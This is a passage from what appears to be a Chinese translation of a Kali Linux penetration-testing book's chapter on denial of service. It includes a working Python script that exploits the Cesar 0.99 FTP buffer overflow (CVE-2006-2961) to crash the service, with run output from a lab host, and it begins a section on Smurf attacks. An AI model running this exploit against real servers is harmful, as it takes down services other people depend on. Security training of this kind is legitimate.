+</code></pre><p>&#x5982;&#x679C;&#x811A;&#x672C;&#x5728;&#x6CA1;&#x6709;&#x9002;&#x5F53;&#x6570;&#x91CF;&#x7684;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8FD4;&#x56DE;&#x9884;&#x671F;&#x7684;&#x7528;&#x6CD5;&#x3002;&#x6709;&#x51E0;&#x4E2A;&#x503C;&#x5FC5;&#x987B;&#x4F5C;&#x4E3A;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x6765;&#x5305;&#x542B;&#x3002;&#x8981;&#x4F20;&#x9012;&#x7ED9;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x3002;&#x6B64; IP &#x5730;&#x5740;&#x662F;&#x4E0E;&#x8FD0;&#x884C;&#x6240;&#x9700;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x7684; FTP &#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#x76F8;&#x5173;&#x7684; IP &#x5730;&#x5740;&#x3002;&#x4E0B;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x8FD0;&#x884C; FTP &#x670D;&#x52A1;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x3002;&#x5728;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;FTP &#x5728; TCP &#x7AEF;&#x53E3; 21 &#x4E2D;&#x8FD0;&#x884C;&#x3002;&#x8F7D;&#x8377;&#x5B9A;&#x4E49;&#x4E86;&#x8981;&#x6279;&#x91CF;&#x4F20;&#x9012;&#x5230;&#x670D;&#x52A1;&#x7684;&#x5B57;&#x7B26;&#x6216;&#x5B57;&#x7B26;&#x5E8F;&#x5217;&#x3002; <code>interval</code>&#x53C2;&#x6570;&#x5B9A;&#x4E49;&#x4E86;&#x5728;&#x4E00;&#x6B21;&#x8FED;&#x4EE3;&#x4E2D;&#x4F20;&#x9012;&#x7ED9; FTP &#x670D;&#x52A1;&#x7684;&#x8F7D;&#x8377;&#x5B9E;&#x4F8B;&#x6570;&#x3002;&#x53C2;&#x6570;&#x4E5F;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x901A;&#x8FC7;&#x8BE5;&#x6570;&#x91CF;&#xFF0C;&#x8F7D;&#x8377;&#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x91CF;&#x5C06;&#x968F;&#x7740;&#x6BCF;&#x6B21;&#x8FDE;&#x7EED;&#x8FED;&#x4EE3;&#x589E;&#x52A0;&#x5230;&#x6700;&#x5927;&#x503C;&#x3002;&#x6B64;&#x6700;&#x5927;&#x503C;&#x7531;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x503C;&#x5B9A;&#x4E49;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x6267;&#x884C;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x5B83;&#x5C06;&#x8BF7;&#x6C42; FTP &#x670D;&#x52A1;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x51ED;&#x8BC1;&#xFF0C;&#x5E76;&#x8BE2;&#x95EE;&#x5E94;&#x8BE5;&#x5BF9;&#x54EA;&#x4E2A;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x540E;&#x7684;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x3002;&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x5BF9; IP &#x5730;&#x5740;<code>172.16.36.134</code>&#x7684; Windows XP &#x4E3B;&#x673A;&#x7684; TCP &#x7AEF;&#x53E3; 21 &#x4E0A;&#x8FD0;&#x884C;&#x7684; FTP &#x670D;&#x52A1;&#x6267;&#x884C;&#x3002;&#x533F;&#x540D;&#x767B;&#x5F55;&#x51ED;&#x636E;&#x4F20;&#x9012;&#x7ED9;&#x4E86;&#x5177;&#x6709;&#x4EFB;&#x610F;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#x7684; FTP &#x670D;&#x52A1;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x4E00;&#x7CFB;&#x5217; As &#x88AB;&#x4F20;&#x9012;&#x5230; MKD &#x9A8C;&#x8BC1;&#x540E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECE; 100 &#x4E2A;&#x5B9E;&#x4F8B;&#x5F00;&#x59CB;&#xFF0C;&#x5E76;&#x6BCF;&#x6B21;&#x589E;&#x52A0; 100&#xFF0C;&#x76F4;&#x5230;&#x8FBE;&#x5230;&#x6700;&#x5927; 1000 &#x4E2A;&#x5B9E;&#x4F8B;&#x3002;&#x540C;&#x6837;&#x7684;&#x811A;&#x672C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4F20;&#x9012;&#x8F7D;&#x8377;&#x4E2D;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x5B57;&#x7B26;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 ABCD 100 500 
+Enter ftp username: anonymous 
+Enter ftp password: user@mail.com 
+Enter FTP command to fuzz: MKD 
+Sending 100 instances of payload (ABCD) to target 
+Sending 200 instances of payload (ABCD) to target 
+Sending 300 instances of payload (ABCD) to target
+Sending 400 instances of payload (ABCD) to target 
+Sending 500 instances of payload (ABCD) to target
+
+There is no indication that the server has crashed
+</code></pre><p>&#x5728;&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x8F7D;&#x8377;&#x88AB;&#x5B9A;&#x4E49;&#x4E3A;<code>ABCD</code>&#xFF0C;&#x5E76;&#x4E14;&#x8BE5;&#x8F7D;&#x8377;&#x7684;&#x5B9E;&#x4F8B;&#x88AB;&#x5B9A;&#x4E49;&#x4E3A; 100 &#x7684;&#x500D;&#x6570;&#xFF0C;&#x76F4;&#x5230;&#x6700;&#x5927;&#x503C; 500&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x8FD9;&#x53EF;&#x80FD;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002; &#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x7279;&#x5B9A;&#x811A;&#x672C;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x662F;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5957;&#x63A5;&#x5B57;&#x5C06;&#x4E0D;&#x518D;&#x63A5;&#x53D7;&#x8F93;&#x5165;&#xFF0C;&#x5E76;&#x4E14;&#x811A;&#x672C;&#x5C06;&#x65E0;&#x6CD5;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x8F7D;&#x8377;&#x6CE8;&#x5165;&#x5E8F;&#x5217;&#x3002; &#x5982;&#x679C;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x811A;&#x672C;&#x9700;&#x8981;&#x4F7F;&#x7528;<code>Ctrl + C</code>&#x5F3A;&#x5236;&#x5173;&#x95ED;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x811A;&#x672C;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6807;&#x5FD7;&#xFF0C;&#x8868;&#x793A;&#x540E;&#x7EED;&#x7684;&#x8F7D;&#x8377;&#x65E0;&#x6CD5;&#x53D1;&#x9001;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x5DF2;&#x5D29;&#x6E83;&#x3002;</p>
+<h2 id="62-ftp-&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;-dos-&#x653B;&#x51FB;">6.2 FTP &#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA; DoS &#x653B;&#x51FB;</h2>
+<p>&#x5728;&#x6B63;&#x786E;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x6570;&#x636E;&#x53EF;&#x80FD;&#x9003;&#x79BB;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x5E76;&#x6D41;&#x5165;&#x76F8;&#x90BB;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x6216;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x6B64;&#x8FC7;&#x7A0B;&#x5C06;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#x5E76;&#x5BFC;&#x81F4;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6216;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002; &#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x672A;&#x7ECF;&#x6388;&#x6743;&#x7684;&#x4EE3;&#x7801;&#x3002; &#x5728;&#x8FD9;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x79D8;&#x7C4D;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E; Cesar 0.99 FTP &#x670D;&#x52A1;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#xFF0C;&#x5C55;&#x793A;&#x5982;&#x4F55;&#x6267;&#x884C; DoS &#x653B;&#x51FB;&#x7684;&#x793A;&#x4F8B;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x6267;&#x884C;&#x8FDC;&#x7A0B;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C; TCP &#x6216; UDP &#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;&#x4E86;&#x62E5;&#x6709; FTP &#x670D;&#x52A1;&#x7684; Windows XP &#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5F00;&#x62AB;&#x9732;&#x7684;&#x6F0F;&#x6D1E;&#x4E0E; Cesar 0.99 FTP &#x670D;&#x52A1;&#x76F8;&#x5173;&#x3002; &#x6B64;&#x6F0F;&#x6D1E;&#x7531;&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x548C;&#x62AB;&#x9732;&#xFF08;CVE&#xFF09;&#x7F16;&#x53F7;&#x7CFB;&#x7EDF;&#x5B9A;&#x4E49;&#x4E3A; CVE-2006-2961&#x3002; &#x901A;&#x8FC7;&#x5BF9;&#x6B64;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x7814;&#x7A76;&#xFF0C;&#x663E;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5411; MKD &#x51FD;&#x6570;&#x53D1;&#x9001;&#x6362;&#x884C;&#x5B57;&#x7B26;&#x7684;&#x9A8C;&#x8BC1;&#x540E;&#x5E8F;&#x5217;&#xFF0C;&#x6765;&#x89E6;&#x53D1;&#x57FA;&#x4E8E;&#x6808;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x3002; &#x4E3A;&#x4E86;&#x907F;&#x514D;&#x5C06;<code>\ n</code>&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x4F20;&#x9012;&#x7ED9; Python &#x811A;&#x672C;&#xFF0C;&#x4EE5;&#x53CA;&#x4E4B;&#x540E;&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x8F93;&#x5165;&#x4E2D;&#x6B63;&#x786E;&#x89E3;&#x91CA;&#x5B83;&#x7684;&#x76F8;&#x5173;&#x56F0;&#x96BE;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x4FEE;&#x6539;&#x5148;&#x524D;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x811A;&#x672C;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4FEE;&#x6539;&#x7684;&#x811A;&#x672C;&#x6765;&#x5229;&#x7528;&#x6B64;&#x73B0;&#x6709;&#x6F0F;&#x6D1E;&#xFF1A;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/python</span>
+
+<span class="hljs-keyword">import</span> socket 
+<span class="hljs-keyword">import</span> sys
+
+<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">5</span>:   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum]&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example will fuzz the defined FTP service with a series of line break &quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;characters to include 100 &apos;\\n&apos;s, 200 &apos;\\n&apos;s, etc... up to the maximum of 1000&quot;</span>   
+    sys.exit()
+
+target = str(sys.argv[<span class="hljs-number">1</span>]) 
+port = int(sys.argv[<span class="hljs-number">2</span>]) 
+i = int(sys.argv[<span class="hljs-number">3</span>]) 
+interval = int(sys.argv[<span class="hljs-number">3</span>]) 
+max = int(sys.argv[<span class="hljs-number">4</span>]) 
+user = raw_input(str(<span class="hljs-string">&quot;Enter ftp username: &quot;</span>)) 
+passwd = raw_input(str(<span class="hljs-string">&quot;Enter ftp password: &quot;</span>)) 
+command = raw_input(str(<span class="hljs-string">&quot;Enter FTP command to fuzz: &quot;</span>))
+
+<span class="hljs-keyword">while</span> i &lt;= max:   
+    <span class="hljs-keyword">try</span>:      
+        payload = command + <span class="hljs-string">&quot; &quot;</span> + (<span class="hljs-string">&apos;\n&apos;</span> * i)      
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Sending &quot;</span> + str(i) + <span class="hljs-string">&quot; line break characters to target&quot;</span>      
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        connect=s.connect((target,port))      
+        s.recv(<span class="hljs-number">1024</span>)
+        s.send(<span class="hljs-string">&apos;USER &apos;</span> + user + <span class="hljs-string">&apos;\r\n&apos;</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        s.send(<span class="hljs-string">&apos;PASS &apos;</span> + passwd + <span class="hljs-string">&apos;\r\n&apos;</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        s.send(payload + <span class="hljs-string">&apos;\r\n&apos;</span>)
+        s.send(<span class="hljs-string">&apos;QUIT\r\n&apos;</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        s.close()
+        i = i + interval
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\nUnable to send...Server may have crashed&quot;</span>
+        sys.exit()
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\nThere is no indication that the server has crashed&quot;</span>
+</code></pre>
+<p>&#x5BF9;&#x811A;&#x672C;&#x6240;&#x505A;&#x7684;&#x4FEE;&#x6539;&#x5305;&#x62EC;&#xFF0C;&#x4FEE;&#x6539;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x548C;&#x5220;&#x9664;&#x4F5C;&#x4E3A;&#x63D0;&#x4F9B;&#x7684;&#x53C2;&#x6570;&#x7684;&#x8F7D;&#x8377;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6362;&#x884C;&#x8F7D;&#x8377;&#x786C;&#x7F16;&#x7801;&#x5230;&#x8981;&#x6309;&#x987A;&#x5E8F;&#x53D1;&#x9001;&#x7684;&#x811A;&#x672C;&#x4E2D;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./ftp_fuzz.py 
+Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum] 
+Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000 
+Example will fuzz the defined FTP service with a series of line break characters to include 100 &apos;\n&apos;s, 200 &apos;\n&apos;s, etc... up to the maximum of 1000 
+root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 100 1000 
+Enter ftp username: anonymous 
+Enter ftp password: user@mail.com 
+Enter FTP command to fuzz: MKD 
+Sending 100 line break characters to target 
+Sending 200 line break characters to target 
+Sending 300 line break characters to target 
+Sending 400 line break characters to target 
+Sending 500 line break characters to target 
+Sending 600 line break characters to target 
+Sending 700 line break characters to target 
+^C 
+Unable to send...Server may have crashed
+</code></pre><p>&#x5982;&#x679C;&#x811A;&#x672C;&#x5728;&#x6CA1;&#x6709;&#x9002;&#x5F53;&#x6570;&#x91CF;&#x7684;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8FD4;&#x56DE;&#x9884;&#x671F;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x811A;&#x672C;&#x5E76;&#x53D1;&#x9001;&#x4E00;&#x7CFB;&#x5217;&#x8F7D;&#x8377;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x6570;&#x91CF;&#x4E3A; 100 &#x7684;&#x500D;&#x6570;&#xFF0C;&#x6700;&#x5927;&#x4E3A; 1000&#x3002;&#x5728;&#x53D1;&#x9001; 700 &#x4E2A;&#x6362;&#x884C;&#x7B26;&#x7684;&#x8F7D;&#x8377;&#x540E;&#xFF0C;&#x811A;&#x672C;&#x505C;&#x6B62;&#x53D1;&#x9001;&#x8F7D;&#x8377;&#xFF0C;&#x5E76;&#x5904;&#x4E8E;&#x7A7A;&#x95F2;&#x72B6;&#x6001;&#x3002; &#x5728;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E0D;&#x6D3B;&#x52A8;&#x540E;&#xFF0C;&#x811A;&#x672C;&#x4F7F;&#x7528;<code>Ctrl + C</code>&#x88AB;&#x5F3A;&#x5236;&#x5173;&#x95ED;&#x3002;&#x811A;&#x672C;&#x8868;&#x793A;&#x5B83;&#x5DF2;&#x7ECF;&#x65E0;&#x6CD5;&#x53D1;&#x9001;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x4E14;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x5D29;&#x6E83;&#x3002; &#x770B;&#x770B;&#x4E0B;&#x9762;&#x7684;&#x622A;&#x56FE;&#xFF1A;</p>
+<p><img src="img/6-2-1.jpg" alt=""></p>
+<p>&#x901A;&#x8FC7;&#x8FD4;&#x56DE;&#x5230;&#x8FD0;&#x884C; Cesar 0.99 FTP &#x670D;&#x52A1;&#x7684; Windows XP &#x4E3B;&#x673A;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>server.exe</code>&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5D29;&#x6E83;&#x4E86;&#x3002; &#x8981;&#x5728;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x540E;&#x6062;&#x590D;&#x64CD;&#x4F5C;&#xFF0C;&#x5FC5;&#x987B;&#x624B;&#x52A8;&#x91CD;&#x65B0;&#x542F;&#x52A8; Cesar FTP &#x670D;&#x52A1;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x8FD9;&#x53EF;&#x80FD;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002; &#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x7279;&#x5B9A;&#x811A;&#x672C;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x662F;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5957;&#x63A5;&#x5B57;&#x5C06;&#x4E0D;&#x518D;&#x63A5;&#x53D7;&#x8F93;&#x5165;&#xFF0C;&#x5E76;&#x4E14;&#x811A;&#x672C;&#x5C06;&#x65E0;&#x6CD5;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x6CE8;&#x5165;&#x5E8F;&#x5217;&#x3002; &#x5982;&#x679C;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x811A;&#x672C;&#x9700;&#x8981;&#x4F7F;&#x7528;<code>Ctrl + C</code>&#x5F3A;&#x5236;&#x5173;&#x95ED;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6807;&#x8BC6;&#xFF0C;&#x8868;&#x660E;&#x540E;&#x7EED;&#x8F7D;&#x8377;&#x65E0;&#x6CD5;&#x53D1;&#x9001;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x5DF2;&#x5D29;&#x6E83;&#x3002;</p>
+<h2 id="63-smurf-dos-&#x653B;&#x51FB;">6.3 Smurf DoS &#x653B;&#x51FB;</h2>
+<p>smurf &#x653B;&#x51FB;&#x662F;&#x5386;&#x53F2;&#x4E0A;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF08;DDoS&#xFF09;&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x6700;&#x53E4;&#x8001;&#x7684;&#x6280;&#x672F;&#x4E4B;&#x4E00;&#x3002; &#x6B64;&#x653B;&#x51FB;&#x5305;&#x62EC;&#x5411;&#x7F51;&#x7EDC;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x53D1;&#x9001;&#x4E00;&#x7CFB;&#x5217; ICMP &#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#xFF0C;&#x5E26;&#x6709;&#x4F2A;&#x9020;&#x7684;&#x6E90; IP &#x5730;&#x5740;&#x3002; &#x5F53;&#x5E7F;&#x64AD;&#x6B64;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;LAN &#x4E0A;&#x7684;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x4F1A;&#x540C;&#x65F6;&#x5BF9;&#x6536;&#x5230;&#x7684;&#x6BCF;&#x4E2A;&#x4F2A;&#x9020;&#x8BF7;&#x6C42;&#x7684;&#x76EE;&#x6807;&#x8FDB;&#x884C;&#x56DE;&#x590D;&#x3002; &#x8FD9;&#x79CD;&#x6280;&#x672F;&#x5BF9;&#x73B0;&#x4EE3;&#x7CFB;&#x7EDF;&#x7684;&#x6548;&#x7387;&#x8F83;&#x4F4E;&#xFF0C;&#x56E0;&#x4E3A;&#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#x4E0D;&#x4F1A;&#x56DE;&#x590D; IP &#x5B9A;&#x5411;&#x7684;&#x5E7F;&#x64AD;&#x6D41;&#x91CF;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x6267;&#x884C;smurf&#x653B;&#x51FB;&#xFF0C;&#x60A8;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;LAN&#xFF0C;&#x4E0A;&#x9762;&#x8FD0;&#x884C;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x5C06; Ubuntu &#x7528;&#x4F5C;&#x626B;&#x63CF;&#x76EE;&#x6807;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Ubuntu &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Ubuntu Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
